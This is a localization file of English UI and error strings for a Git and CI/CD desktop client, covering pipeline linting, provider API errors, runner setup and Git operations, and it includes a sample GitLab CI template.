no-such-script-in-package = { $a0 } { $a1 }{ $a2 }: no such script in package.json
scripts-section-of-has = The scripts section of { $a0 } has: { $a1 }.
nothing = nothing
add-to-scripts-or-fix = Add "{ $a0 }" to scripts or fix the name.{ $a1 }
similar = {" "}Similar: { $a0 }.
yarn-with-frozen-lockfile-without = yarn with --frozen-lockfile without yarn.lock
has-no-yarn-lock = { $a0 } has no yarn.lock.
commit-yarn-lock-or-remove = Commit yarn.lock or remove the flag.
pnpm-install-without-pnpm-lock = pnpm install without pnpm-lock.yaml
in-ci-pnpm-uses-frozen = In CI, pnpm uses --frozen-lockfile by default: "ERR_PNPM_NO_LOCKFILE Cannot install with "frozen-lockfile" because pnpm-lock.yaml is absent".
has-no-pnpm-lock-yaml = { $a0 } has no pnpm-lock.yaml.
commit-pnpm-lock-yaml-or = Commit pnpm-lock.yaml or add --no-frozen-lockfile.
pip-install-r-no-such = pip install -r { $a0 }: no such file
check-name-requirements-txt-requirements = Check the name (requirements.txt / requirements-dev.txt) and the folder.
poetry-install-without-pyproject-toml = poetry install without pyproject.toml
has-no-pyproject-toml = { $a0 } has no pyproject.toml.
go-to-project-folder-or = Go to the project folder or add pyproject.toml.
make-no-makefile-in = make: no Makefile in { $a0 }
has-no-makefile = { $a0 } has no Makefile.
add-makefile-or-go-to = Add a Makefile or go to the right folder (make -C folder …).
no = no
make-no-such-target-in = make { $a0 }: no such target in { $a1 }
has-targets = { $a0 } has targets: { $a1 }.
fix-target-name-or-add = Fix the target name or add it to the Makefile.
mvn-no-pom-xml = mvn: no pom.xml
gradle-no-build-gradle = gradle: no build.gradle
gradle-wont-find-build-directory = Gradle won't find the build: "Directory … does not contain a Gradle build".
go-no-go-mod = go: no go.mod
cargo-no-cargo-toml = cargo: no Cargo.toml
composer-no-composer-json = composer: no composer.json
bundle-no-gemfile = bundle: no Gemfile
dotnet-no-project-sln-csproj = dotnet: no project (.sln / .csproj)
has-no = { $a0 } has no { $a1 }.
go-to-project-folder-cd-or = Go to the project folder (cd …) or check the path.
docker-build-no = docker build: no { $a0 }
specify-right-path-with-f = Specify the right path with -f or fix the build context.
docker-compose-f-no-such = docker compose -f { $a0 }: no such file
kubectl-f-no-such-file = kubectl { $a0 } -f { $a1 }: no such file

## crates/gorynych-ci-linter/src/check/tags.rs

online = online
busy = busy
offline = offline
paused = paused
and-more = {" "}and { $a0 } more
no-runner-picks-up-untagged = No runner picks up untagged jobs
all-runners-for-untagged-jobs = All runners for untagged jobs are offline or paused
on-run = On run { $a0 }
job-will-hang-in-queue = The job will hang in the queue (Pending): "This job is stuck because the project doesn’t have any runners online assigned to it".
all-project-runners-have-run = All project runners have "Run untagged jobs" turned off.
matching = Matching: { $a0 }
add-tags-live-runners-tag = Add tags: [<a live runner's tag>] to the job or turn on "Run untagged jobs" for a runner.
tag = the tag "{ $a0 }"
tag-set = the tag set { $a0 }
tags = the tags { $a0 }
runners-with-these-tags-exist = Runners with these tags exist, but { $a0 }.
each-tag-belongs-to-some = Each tag belongs to some online runner, but none has all of them: a job is picked up only by a runner that has every listed tag.
no-online-runner-has = No online runner has { $a0 }.
this-tag = this tag
these-tags = these tags
no-active-runners-with-pipeline = No active runners with { $a0 } — the pipeline will hang in the queue (Pending)!
job-will-wait-in-queued = The job will wait in Queued status until a matching runner appears (up to 24 hours), then get canceled.
check-tags-for-typos-or = Check the tags for typos or connect a runner with these tags ("Runners" tab → "Connect runner").
start-or-unpause-matching-runner = Start or unpause a matching runner ("Runners" tab).

## crates/gorynych-ci-linter/src/edit/file.rs

gitlab-ci-pipeline-stages-run =
    # GitLab CI pipeline: stages run in order, jobs of one stage run in parallel
    stages: [build, test, deploy]
    {""}
    default:
    {"  "}image: node:20
    {""}
    build:
    {"  "}stage: build
    {"  "}script:
    {"    "}- npm ci
    {"    "}- npm run build
    {"  "}artifacts:
    {"    "}paths: [dist/]
    {""}
    test:
    {"  "}stage: test
    {"  "}script:
    {"    "}- npm ci
    {"    "}- npm test
    {""}
    deploy:
    {"  "}stage: deploy
    {"  "}script:
    {"    "}- echo "Deploy"
    {"  "}rules:
    {"    "}- if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
    {"      "}when: manual
    {""}
writing-here-isnt-allowed = Writing here isn't allowed
only-ci-cd-files-yml = Only CI/CD files (.yml, .yaml, Jenkinsfile) can be saved
file-is-too-large = The file is too large
file-changed-on-disk-while = The file changed on disk while you were editing it
click-reload-to-load-fresh = Click "Reload" to load the fresh version, or save over it (your edits will replace the changes on disk).
no-template-for-this-system = No template for this system
file-already-exists = File { $a0 } already exists

## crates/gorynych-ci-linter/src/edit/ops.rs

job-not-found-in-this = Job "{ $a0 }" not found in this file
job-3 = job
stage = stage
enter-name = Enter a name ({ $a0 })
name-is-too-long = The name is too long
name-cant-contain-line-break = The name can't contain a line break
is-reserved-word-in-gitlab = "{ $a0 }" is a reserved word in GitLab CI
job-already-exists = Job "{ $a0 }" already exists
job-must-have-at-least = A job must have at least one script step
invalid-when-value = Invalid when value: { $a0 }
removed-from = "{ $a0 }": removed from { $a1 }
reference-updated-in = "{ $a0 }": reference updated in { $a1 }
field-cant-be-changed-here = Field { $a0 } can't be changed here
stage-added-to-stages = Stage "{ $a0 }" added to stages
stage-already-exists = Stage "{ $a0 }" already exists
stage-not-found-in-stages = Stage "{ $a0 }" not found in stages
jobs-moved = Jobs moved: { $a0 }
stage-has-jobs = Stage "{ $a0 }" has jobs: { $a1 }
move-or-delete-these-jobs = Move or delete these jobs first
unknown-edit = Unknown edit
file-has-yaml-errors-fix = The file has YAML errors — fix them in the "File" tab first
file-must-be-mapping-key = The file must be a mapping (key: value) at the top level

## crates/gorynych-ci-linter/src/edit/text.rs

couldnt-apply-edit-without-rewriting = Couldn't apply the edit without rewriting the file
make-this-change-by-hand = Make this change by hand in the File tab

## crates/gorynych-ci-linter/src/load/actions.rs

parameters = parameters: { $a0 }
after = after: { $a0 }
step-4 = Step { $a0 }
min = { $a0 } min
file-has-no-jobs-section = The file has no jobs section
needs-refers-to-which-doesnt = "{ $a0 }": needs refers to "{ $a1 }", which doesn't exist
run-name = Run name
token-permissions = Token permissions
when-it-runs-on = When it runs (on)

## crates/gorynych-ci-linter/src/load/common.rs

file-is-too-large-kb = File { $a0 } is too large ({ $a1 } KB)
if = if { $a0 }
changed = { $a0 } changed
exists = { $a0 } exists
in-all-other-cases = in all other cases
start = Start
after-step = After step { $a0 }

## crates/gorynych-ci-linter/src/load/gitlab.rs

extends-refers-to-unknown-job = "{ $a0 }": extends refers to an unknown job "{ $a1 }"
reference-refers-to-something-that = !reference [{ $a0 }] refers to something that doesn't exist
couldnt-read = Couldn't read { $a0 }: { $a1 }
include-is-nested-too-deeply = include is nested too deeply
file-not-found-in-repository = File not found in the repository
needs-refers-to-job-which = "{ $a0 }": needs refers to job "{ $a1 }", which doesn't exist
stage-isnt-declared-in-stages = "{ $a0 }": stage "{ $a1 }" isn't declared in stages — GitLab won't run the pipeline
pipeline-name = Pipeline name
default-image = Default image
runner-tags = Runner tags
when-pipeline-is-created-workflow = When the pipeline is created (workflow:rules)
pipeline = Pipeline
global = global
times = { $a0 } times

## crates/gorynych-ci-linter/src/load/jenkins.rs

parallel = { $a0 } · parallel
agent = Agent
syntax = Syntax
couldnt-find-stage-blocks-showing = Couldn't find stage(...) blocks — showing the file only
triggers = Triggers

## crates/gorynych-ci-linter/src/load/pipelines.rs

concurrency = Concurrency
default-all-branches = default — all branches
services = Services
pipelines-section-not-found = pipelines section not found
pipelines = Pipelines
jobs-2 = Jobs
config-version = Config version
job-4 = Job
steps = Steps
disabled = disabled
pool = Pool
when-it-runs = When it runs
sections = Sections

## crates/gorynych-cicd/src/detect_server.rs

didnt-respond-within-s = { $a0 } didn't respond within { $a1 } s
no-connection-to = No connection to { $a0 }

## crates/gorynych-cicd/src/gitlab/api.rs

invalid-pipeline-number = Invalid pipeline number
pipeline-not-found-it-may = Pipeline #{ $a0 } not found — it may have been deleted
invalid-job-number = Invalid job number
job-not-found-it-may = Job #{ $a0 } not found — it may have been deleted
unknown-action = Unknown action
no-branch-specified = No branch specified
invalid-number = Invalid number
read-only-token = Read-only token
running-and-canceling-require-token = Running and canceling require a token with the "api" scope — create a new one and save it
invalid-variable-name = Invalid variable name
variable-not-found-it-may = Variable { $a0 } not found — it may have been deleted
no-content = No content
this-gitlab-server-doesnt-support = This GitLab server doesn't support CI checks via the API (GitLab 13.6 or newer is needed)
variable-name-only-latin-letters = Variable name: only Latin letters, digits and _
value-is-too-long = The value is too long
enter-value = Enter a value
value-of-hidden-variable-cant = The value of a hidden variable can't be read — enter it again
variable-is-already-deleted = Variable { $a0 } is already deleted
enter-schedule-description = Enter a schedule description
choose-branch = Choose a branch
invalid-cron-format = Invalid cron format
five-space-separated-fields-minute = Five space-separated fields: minute hour day month weekday, for example "0 3 * * *"
schedule-not-found-it-may = Schedule not found — it may have been deleted
invalid-schedule-number = Invalid schedule number
source-branch = source branch
target-branch = target branch
no-specified = No { $a0 } specified
source-and-target-branches-are = The source and target branches are the same
push-branch-to-server-first = Push the branch to the server first.

## crates/gorynych-cicd/src/gitlab/auth.rs

pipeline-token-in-repository-sign = The pipeline token in the repository sign-in
repository-sign-in-token = The repository sign-in token
doesnt-work-for-pipelines = { $a0 } doesn't work for pipelines: { $a1 }.
repository-is-signed-in-with = The repository is signed in with an SSH key — git accepts it, but the GitLab API doesn't. Add a token for pipelines to the repository sign-in.
repository-sign-in-password-cant = The repository sign-in password can't be decrypted — sign in again.
repository-is-signed-in-with-username = The repository is signed in with a username and password — the GitLab API accepts only tokens. Add a token for pipelines to the repository sign-in.
token-has-no-api-scope = the token has no API scope: it has only { $a0 }, but "api" or "read_api" is needed
token-has-no-api-scope-api = the token has no API scope ("api" or "read_api" is needed)
gitlab-doesnt-accept-this-token = GitLab doesn't accept this token for the API — it's revoked, expired or not a personal token
server-didnt-respond = the server didn't respond

## crates/gorynych-cicd/src/gitlab/http.rs

already-exists = already exists
cant-be-empty = can't be empty
invalid-value = invalid value
too-long = too long
too-short = too short
cant-be-masked = can't be masked
name = Name
value-2 = Value
schedule-cron = Schedule (cron)
time-zone = Time zone
branch = Branch
description = Description
environment = Environment
gitlab-rejected-request = GitLab rejected the request
cron-format-minute-hour-day = cron format: "minute hour day month weekday", for example "0 3 * * *" — every day at 3:00
variable-name-latin-letters-digits = Variable name: Latin letters, digits and _
masked-value-one-line-at = Masked value: one line, at least 8 characters, only letters, digits and the characters @ : . ~ - _ + / =
check-internet-vpn-and-gitlab = Check the internet, VPN and the GitLab server address
gitlab-didnt-respond-within-s = GitLab didn't respond within { $a0 } s
gitlab-rejected-token = GitLab rejected the token
token-is-wrong-revoked-or = The token is wrong, revoked or expired — create a new one and save it again
insufficient-permissions = Insufficient permissions
token-lacks-required-scope-actions = The token lacks the required scope. Actions need the "api" scope, viewing — "read_api"
your-role-in-project-doesnt = Your role in the project doesn't allow this action
not-found-in-gitlab = Not found in GitLab
project-doesnt-exist-or-token = The project doesn't exist or the token has no access to it
gitlab-rate-limited-requests-try = GitLab rate-limited the requests — try again in a minute
gitlab-returned-error = GitLab returned error { $a0 }

## crates/gorynych-cicd/src/gitlab/light.rs

gitlab-rate-limited-requests = GitLab rate-limited the requests
gitlab-returned = GitLab returned { $a0 }

## crates/gorynych-cicd/src/gitlab/mod.rs

changes-require-token-with-api = Changes require a token with the "api" scope — create a new one and save it in the settings
repository-has-no-remote = The repository has no remote
remote-doesnt-look-like-gitlab = The remote doesn't look like GitLab
if-its-your-own-gitlab = If it's your own GitLab server, save a token for it in the settings
repository-sign-in-doesnt-work = The repository sign-in doesn't work for pipelines
repository-isnt-signed-in = The repository isn't signed in
sign-in-to-repository-same = Sign in to the repository — the same sign-in also works for pipelines

## crates/gorynych-cicd/src/http.rs

check-internet-vpn-and-api = Check the internet, VPN and the API address { $a0 }
didnt-accept-repository-sign-in = { $a0 } didn't accept the repository sign-in
token-is-wrong-revoked-or-expired = The token is wrong, revoked or expired — update the repository sign-in
rate-limited-requests-try-again = { $a0 } rate-limited the requests — try again later
token-lacks-required-permission-or = The token lacks the required permission or your role in the repository doesn't allow this action
not-found-on = Not found on { $a0 }
repository-doesnt-exist-token-has = The repository doesn't exist, the token has no access to it, or { $a0 } doesn't support this request
rejected-request = { $a0 } rejected the request
rate-limited-requests-try-again-in = { $a0 } rate-limited the requests — try again in a minute
returned-error = { $a0 } returned error { $a1 }

## crates/gorynych-cicd/src/models.rs

doesnt-allow-this-via-api = { $a0 } doesn't allow this via the API

## crates/gorynych-cicd/src/providers/bitbucket.rs

bitbucket-doesnt-expose-runners-in = Bitbucket doesn't expose runners in its public API — manage them in the repository settings (Repository settings → Runners)
bitbucket-doesnt-provide-pipeline = Bitbucket doesn't provide pipeline artifacts via its public API
bitbucket-runner-is-registered-in = A Bitbucket runner is registered in the repository settings — the start command is shown there
bitbucket-data-center-doesnt-support = Bitbucket Data Center doesn't support Pipelines
on-self-hosted-bitbucket-builds = On a self-hosted Bitbucket, builds usually run in Bamboo or Jenkins
repository-not-found-or-sign = Repository { $a0 }/{ $a1 } not found or the sign-in has no access to it
pipeline-not-found = Pipeline #{ $a0 } not found
no-pipeline-specified-for-step = No pipeline specified for the step
bitbucket-doesnt-support-this-action = Bitbucket doesn't support this action
invalid-variable-name-2 = Invalid variable name: { $a0 }
bitbucket-doesnt-expose-runners-in-its = Bitbucket doesn't expose runners in its public API
variable-not-found = Variable { $a0 } not found

## crates/gorynych-cicd/src/providers/gitea.rs

in-gitea-runner-labels-are = In Gitea, runner labels are set at registration (act_runner register --labels) or in its config.yaml
gitea-has-no-runner-pause = Gitea has no runner pause — stop act_runner on the server
gitea-doesnt-allow-changing-runner = Gitea doesn't allow changing runner settings via the API
run-not-found = Run #{ $a0 } not found
gitea-doesnt-allow-canceling-or = Gitea doesn't allow canceling or re-running runs via the API
open-run-in-browser = Open the run in the browser
choose-workflow-to-run = Choose a workflow to run
running-workflow-via-api-is = Running a workflow via the API is supported in Gitea 1.23 and later (and the workflow must be pushed to the server)
runner-list-api-is-available = The runner list API is available in Gitea 1.24 and later
gitea-doesnt-allow-changing-runner-via = Gitea doesn't allow changing a runner via the API
labels-are-set-in-runners = Labels are set in the runner's config.yaml or at registration
runner-is-already-deleted-or = The runner is already deleted or Gitea doesn't support deleting via the API

## crates/gorynych-cicd/src/providers/github.rs

repository-not-found-or-token = Repository { $a0 }/{ $a1 } not found or the token has no access to it
github-runs-workflow-only-with = GitHub runs a workflow only with inputs — environment variables are set in the workflow itself
github-has-no-runner-pause = GitHub has no runner pause — stop the runner service on the server
runners-and-secrets-are-visible = Runners and secrets are visible only to repository admins
run-not-found-it-may = Run #{ $a0 } not found — it may have been deleted
job-not-found = Job #{ $a0 } not found
github-doesnt-support-this-action = GitHub doesn't support this action
workflow-not-found-on-server = Workflow { $a0 } not found on the server — is it committed and pushed to the default branch?
github-doesnt-allow-changing-these = GitHub doesn't allow changing these runner settings
runner-is-already-deleted = The runner is already deleted

## crates/gorynych-cicd/src/providers/gitlab.rs

read-only-token-read-api = Read-only token (read_api) — actions need the "api" scope
project-runners-can-be-changed = Project runners can be changed by the Maintainer role and above
running-needs-token-with-api = Running needs a token with the "api" scope
only-latin-letters-digits-and = Only Latin letters, digits and _
maximum-timeout-is-at-least = Maximum timeout is at least 600 seconds (10 minutes)
runner-without-tags-must-pick = A runner without tags must pick up untagged jobs
add-tag-or-turn-on = Add a tag or turn on "Run untagged jobs"
runner-not-found-or-you = Runner not found or you don't have permission to change it
runner-not-found-it-may = Runner not found — it may already have been deleted
git-gorynych = git-Горыныч
couldnt-get-runner-token = Couldn't get a runner token
maintainer-role-in-project-is = The Maintainer role in the project is required
jobs-artifacts-were-deleted-or = The job's artifacts were deleted or have expired

## crates/gorynych-cicd/src/runner_setup.rs

latest-act-runner-version-https = # Latest act_runner version: https://gitea.com/gitea/act_runner/releases
docker-isnt-installed = Docker isn't installed
install-docker-desktop-and-start = Install Docker Desktop and start it
local-runner-isnt-supported-for = A local runner isn't supported for this provider
docker-isnt-running = Docker isn't running
start-docker-desktop-and-try = Start Docker Desktop and try again
docker-returned-error = Docker returned an error
this-isnt-app-runner = This isn't an app runner

## crates/gorynych-cicd/src/seal.rs

invalid-repository-public-key = Invalid repository public key

## crates/gorynych-cicd/src/service.rs

repository-sign-in-doesnt-work-for = The repository sign-in doesn't work for { $a0 }: { $a1 }{ $a2 }
repository-is-signed-in-with-ssh = The repository is signed in with an SSH key — git accepts it, but the { $a0 } API doesn't. Add a token for pipelines to the repository sign-in.
unavailable = { $a0 }: { $a1 } unavailable
token-needs-repo-and-workflow = The token needs the repo and workflow scopes (classic) or Actions, Administration and Secrets (fine-grained)
token-needs-write-repository-and = The token needs write:repository (and read:user)
bitbucket-api-token-needs-read = The Bitbucket API token needs the read:repository:bitbucket and read:pipeline:bitbucket scopes, and write:pipeline:bitbucket for actions
app-password-needs-pipelines-read = The app password needs Pipelines: Read/Write and Repositories: Read
couldnt-determine-ci-cd-service = Couldn't determine the CI/CD service
set-provider-gitlab-github-gitea = Set the provider (GitLab, GitHub, Gitea, Bitbucket) and the API address in the repository's CI/CD settings
sign-in-to-repository-same-sign = Sign in to the repository — the same sign-in works for { $a0 }
repository-sign-in-doesnt-work-for-ci = The repository sign-in doesn't work for CI/CD
action = action
run = run
variables-at-run-time-arent = Variables at run time aren't supported
by-branch-branches-default = By branch (branches / default)
runners-unavailable = Runners unavailable
changing-labels = changing labels
pause = pause
runner-settings = runner settings
deleting-runner = deleting a runner
deleting-runners = deleting runners
registering-runner = registering a runner
local-runner = local runner
git-gorynych-local-docker = git-Горыныч (local Docker)
no-artifact-or-file-specified = No artifact or file specified
downloading-artifacts = downloading artifacts
secrets = secrets
name-latin-letters-digits-and = Name: Latin letters, digits and _, not starting with a digit
names-starting-with-github-are = Names starting with GITHUB_ are reserved
value-is-larger-than-48 = The value is larger than 48 KB

## crates/gorynych-core/src/error.rs

install-git-for-windows-git = Install Git for Windows (git-scm.com). If Git is already installed, fully close the terminal/VS Code{" "}
app-was-started-from-and = the app was started from and open it again: old windows don't see the updated PATH.
git-not-found = Git not found
operation-timed-out = The operation timed out
server-didnt-respond-in-time = The server didn't respond in time, or Git was waiting for a username. Try again.
git-error = Git error

## crates/gorynych-core/src/paths.rs

invalid-path = Invalid path
path-is-outside-repository = The path is outside the repository

## crates/gorynych-git/src/actions/checkout.rs

there-are-unresolved-conflicts-in = There are unresolved conflicts in the working folder
resolve-them-first-then-switch = Resolve them first, then switch.
changes-came-back-with-conflicts = Changes came back with conflicts — the stash was kept
branch-not-found = Branch "{ $a0 }" not found
it-may-have-been-deleted = It may have been deleted — refresh the list (Fetch)
unknown-strategy = Unknown strategy: { $a0 }
there-are-uncommitted-changes-in = There are uncommitted changes in the working folder ({ $a0 })
choose-what-to-do-with = Choose what to do with them: stash, move to the new branch or discard.

## crates/gorynych-git/src/actions/history.rs

cant-undo-has-changed-since = Can't undo: { $a0 } has changed since the operation
repository-was-changed-outside-app = The repository was changed outside the app or by another operation.
branch-2 = branch { $a0 }
stash-list = stash list
cant-go-back-it-was = Can't go back: it was a detached HEAD before switching
repositorys-first-commit-cant-be = The repository's first commit can't be undone
commit-has-already-been-pushed = The commit has already been pushed — undoing it would rewrite shared history
use-revert-coming-later = Use revert (coming later).
there-are-already-changes-in = There are already changes in the working folder
commit-or-stash-them-then = Commit or stash them, then Undo again.
tag-2 = tag { $a0 }
unknown-which-commit-branch-was = Unknown which commit the branch was on
branch-commit-isnt-available-locally = The branch commit isn't available locally — can't restore it on the server
fetch-on-teammates-machine-or = Fetch on a teammate's machine or restore the branch on the server.

## crates/gorynych-git/src/actions/mod.rs

unknown-action-2 = Unknown action: { $a0 }
nothing-to-undo = Nothing to undo
nothing-to-redo = Nothing to redo
checkout-with-changes-moved = Checkout { $a0 } with changes moved
checkout-discarding-changes = Checkout { $a0 } discarding changes
with-conflict-resolution = { $a0 } (with conflict resolution)
create-branch = Create branch { $a0 }
delete = Delete { $a0 }
return-to = Return to { $a0 }
tag-3 = Tag { $a0 }
delete-tag = Delete tag { $a0 }
delete-from-server = Delete { $a0 }/{ $a1 } from the server
rename = Rename { $a0 } → { $a1 }
delete-branch = Delete branch { $a0 }
rebase-onto = Rebase onto { $a0 }
before = before
from = from
file-version = File { $a0 } → version { $a1 } { $a2 }
file = file
files = files
from-2 = From { $a0 }: { $a1 } { $a2 }
revert-part-of-commit = Revert part of a commit
discard-changes = Discard changes
hunk-from-stash = Hunk from stash
into = { $a0 } into { $a1 }
update = Update { $a0 }

## crates/gorynych-git/src/actions/ops.rs

enter-branch-name = Enter a branch name
invalid-branch-name = Invalid branch name: "{ $a0 }"
spaces-and-are-not-allowed = Spaces, "..", "~", "^", ":", "?", "*", "[" and "\" are not allowed.
branch-already-exists = Branch "{ $a0 }" already exists
make-first-commit-first = Make the first commit first
invalid-commit = Invalid commit
not-found-2 = Not found: { $a0 }
check-branch-name-or-fetch = Check the branch name or Fetch.
unclosed-quote-in-command = Unclosed quote in the command
empty-command = Empty command
no-changes-to-stash = No changes to stash
stash-is-unavailable-until-first = Stash is unavailable until the first commit
no-stashes = No stashes
invalid-stash = Invalid stash
stash-not-found-list-has = Stash not found — the list has changed
stash-list-has-changed-refresh = The stash list has changed — refresh and try again
enter-tag-name = Enter a tag name
invalid-tag-name = Invalid tag name: "{ $a0 }"
tag-already-exists = Tag "{ $a0 }" already exists
tag-not-found = Tag "{ $a0 }" not found
enter-new-branch-name = Enter a new branch name
name-hasnt-changed = The name hasn't changed
no-spaces-or = No spaces, "..", "~", "^", ":", "?", "*", "[" or "\".
branch-already-exists-2 = Branch "{ $a0 }" already exists
cant-delete-current-branch = Can't delete the current branch
switch-to-another-branch-first = Switch to another branch first.
branch-is-not-merged-into = Branch "{ $a0 }" is not merged into the current one
commits-that-exist-only-in = Commits that exist only in this branch will become unreachable (Undo can bring them back).
this-commit-is-already-in = This commit is already in the current branch
unknown-reset-mode = Unknown reset mode
is-already-merged-into = { $a0 } is already merged into { $a1 }
already-contains = { $a0 } already contains { $a1 }
already-points-to-this-commit = { $a0 } already points to this commit
cant-fast-forward-it-has = Can't fast-forward { $a0 }: it has commits that { $a1 } doesn't have
use-merge-or-rebase = Use merge or rebase.
no-changes = No changes
files-already-match-this-commit = The files already match this commit — nothing to revert
there-are-uncommitted-changes = There are uncommitted changes ({ $a0 })
commit-them-or-stash-then = Commit them or Stash, then try again.
untracked-files-are-in-way = Untracked files are in the way of the revert
move-or-delete = Move or delete: { $a0 }{ $a1 }
files-restored-to-state-of =
    Files restored to the state of { $a0 }.
    Reverted changes of { $a1 } commits:
    { $a2 }{ $a3 }
files-brought-to-state-of = Files brought to the state of { $a0 }.
no-operation-in-progress = No operation in progress
unresolved-conflicts-remain = Unresolved conflicts remain: { $a0 }
fix-files-marked-u-and = Fix the files marked U and stage them (the + button in the file list).

## crates/gorynych-git/src/actions/remote.rs

add-remote-git-remote-add = Add a remote: git remote add origin <url>
no-access-to = No access to { $a0 }
no-write-access = No write access
unknown-pull-mode = Unknown pull mode
branch-has-no-upstream = Branch "{ $a0 }" has no upstream
push-it-branch-will-be = Push it — the branch will be published and linked to the remote.
remote-branch-was-deleted = Remote branch { $a0 } was deleted
push-to-create-it-again = Push to create it again, or switch to another branch.
has-commits-that-your-branch = { $a0 } has commits that your branch doesn't have
pull-and-push-again-or = Pull and push again, or Force Push (with lease) to overwrite the remote branch.
remote-not-found = Remote "{ $a0 }" not found
branch-no-longer-exists-on = Branch { $a0 } no longer exists on { $a1 }
it-was-deleted-earlier-branch = It was deleted earlier — the branch list has been refreshed.
cant-delete-its-repositorys-default = Can't delete { $a0 }: it's the repository's default branch on the server
change-default-branch-in-project = Change the default branch in the project settings on GitLab/GitHub first.
branch-is-protected-on-server = Branch { $a0 } is protected on the server and can't be deleted
remove-branch-protection-in-project = Remove the branch protection in the project settings (Settings → Repository → Protected branches) or delete it in the web interface.
was-deleted-on-server = { $a0 } was deleted on the server
nothing-to-update-from-branch = Nothing to update from: the branch was deleted on the server.
update-2 = update
has-its-own-commits-cant = { $a0 } has its own commits — can't fast-forward
use-pull-merge-or-rebase = Use Pull (merge or rebase) to combine the changes.
update-would-touch-files-with = The update would touch files with your uncommitted changes
commit-or-stash-your-changes = Commit or stash your changes and try again.
has-unpushed-commits = { $a0 } has unpushed commits ({ $a1 })
cant-update-without-switching-switch = Can't update without switching: switch to the branch and Pull (merge or rebase).
has-diverged-from = { $a0 } has diverged from { $a1 }
switch-to-branch-and-pull = Switch to the branch and Pull (merge or rebase).
is-checked-out-in-another = { $a0 } is checked out in another working folder (worktree)
branch-has-no-branch-on = Branch "{ $a0 }" has no branch on the server
push-to-publish-it = Push to publish it.

## crates/gorynych-git/src/actions/state.rs

cant-is-not-finished = Can't { $a0 }: { $a1 } is not finished
resolve-conflicts-and-click-continue = Resolve the conflicts and click "Continue" in the yellow bar at the top, or "Abort".
cant-repository-has-no-commits = Can't { $a0 }: the repository has no commits yet
cant-from-detached-head = Can't { $a0 } from a detached HEAD
switch-to-branch-double-click = Switch to a branch (double-click a branch in the list on the left) or create a new one.
cant-no-commits = Can't { $a0 }: no commits

## crates/gorynych-git/src/clone.rs

choose-folder-to-clone-into = Choose a folder to clone into
invalid-folder-name = Invalid folder name
folder-not-found = Folder not found: { $a0 }
folder-already-exists-and-isnt = Folder "{ $a0 }" already exists and isn't empty
choose-different-name-or-different = Choose a different name or a different folder.
counting-objects = Counting objects
compressing-on-server = Compressing on the server
downloading = Downloading
processing = Processing
unpacking-files = Unpacking files
cloning-canceled = Cloning canceled
done = Done

## crates/gorynych-git/src/compare.rs

same-commit-is-selected = The same commit is selected
invalid-regular-expression = Invalid regular expression
expression-matches-empty-string = The expression matches an empty string
query-is-too-long = The query is too long

## crates/gorynych-git/src/conflicts.rs

mine = Mine
your-current-branch = Your current branch
theirs = Theirs
incoming-branch = Incoming branch
incoming-branch-2 = Incoming branch · "{ $a0 }"
branch-youre-rebasing-onto-already = The branch you're rebasing onto (already on the server / in upstream)
your-commit = your commit
your-commit-thats-being-moved = Your commit that's being moved now
commit-being-moved = Commit being moved
commit-revert = Commit revert
changes-from-cherry-pick = Changes from cherry-pick
revert-changes = Revert changes
current = Current
working-version = working version
file-before-applying-stash = The file before applying the stash
from-stash = From stash
stashed-changes = stashed changes
changes-from-stash = Changes from stash
conflict-markers-remain-in-result = Conflict markers remain in the result
resolve-all-conflict-blocks = Resolve all conflict blocks.
invalid-side = Invalid side
file-still-has-conflict-markers = The file still has conflict markers
resolve-conflict-in-editor-or = Resolve the conflict in the editor or mark it resolved forcibly.

## crates/gorynych-git/src/diff.rs

unknown-diff-mode = Unknown diff mode

## crates/gorynych-git/src/history.rs

no-file-specified = No file specified
file-isnt-in-version = File { $a0 } isn't in version { $a1 }
file-doesnt-exist = File { $a0 } doesn't exist
file-may-have-been-created = The file may have been created later or renamed

## crates/gorynych-git/src/init.rs

general-os-and-editors = General (OS and editors)
os = # OS
editors = # Editors
logs-and-secrets = # Logs and secrets
no-folder-specified = No folder specified
this-isnt-folder = This isn't a folder
invalid-email = Invalid email: "{ $a0 }"
this-folder-is-already-git = This folder is already a Git repository
enter-author-name-for-first = Enter the author name for the first commit
enter-author-email-for-first = Enter the author email for the first commit
remote-address-must-not-contain = The remote address must not contain spaces
name-and-email-for-all = Name and email (for all repositories)
name-and-email-for-this = Name and email (for this repository)
first-commit = First commit
specify-repository-address = Specify the repository address
address-must-not-contain-spaces = The address must not contain spaces
doesnt-look-like-git-repository = Doesn't look like a Git repository address
example-https-gitlab-com-user = Example: https://gitlab.com/user/project.git or git@gitlab.com:user/project.git
gitlab-over-https-sign-in = GitLab over HTTPS: sign in through the Git Credential Manager window or use a Personal Access Token (scope: read_repository and write_repository) instead of a password. Over SSH: add your public key in GitLab → Preferences → SSH Keys.
github-over-https-sign-in = GitHub over HTTPS: sign in through the Git Credential Manager window or use a Personal Access Token. Over SSH: add your key in Settings → SSH and GPG keys.
this-folder-already-has-git = This folder already has a Git repository
enter-author-name-for-commit = Enter the author name for the commit
enter-author-email-for-commit = Enter the author email for the commit
server-has-no-branch = The server has no branch "{ $a0 }"
author-name-and-email = Author name and email
downloading-from-server = Downloading { $a0 } from the server
applying-server-history = Applying the server history
commit-project-files = Commit the project files
in-gitlab-main-branch-is = In GitLab the main branch is protected: only Maintainers can push to it. Ask for the Maintainer role, remove the protection (Settings → Repository → Protected branches) or push the changes to a separate branch.

## crates/gorynych-git/src/read.rs

folder-isnt-git-repository = The folder isn't a Git repository: { $a0 }
invalid-commit-hash = Invalid commit hash

## crates/gorynych-git/src/rebase.rs

finish-current-operation-first-merge = Finish the current operation first (merge / rebase / cherry-pick)
continue-or-abort-it-in = Continue or abort it in the yellow bar at the top.
repository-has-no-commits-yet = The repository has no commits yet
rebase-works-on-branch-but = Rebase works on a branch, but HEAD is detached now
switch-to-branch-whose-history = Switch to the branch whose history you want to change.
no-specified-2 = No { $a0 } specified
commit = commit
this-is-branchs-last-commit = This is the branch's last commit — there's nothing after it to change
too-many-commits-for-rebase = Too many commits for a rebase: { $a0 }
choose-closer-point-no-more = Choose a closer point (no more than { $a0 } commits).
rebase-preview-needs-git-2 = The rebase preview needs Git 2.40 or newer
update-git-for-windows-git = Update Git for Windows (git-scm.com) and restart the app.
plan-is-outdated-commit-list = The plan is outdated — the commit list changed
open-rebase-again = Open the rebase again.
commit-message-cant-be-empty = The commit message can't be empty
first-commit-has-nothing-to = The first commit has nothing to combine with
squash-and-fixup-join-commit = Squash and fixup join a commit to the previous one — the very first one has no previous.
very-first-commit-of-repository = The very first commit of the repository can't be moved
invalid-preview = Invalid preview
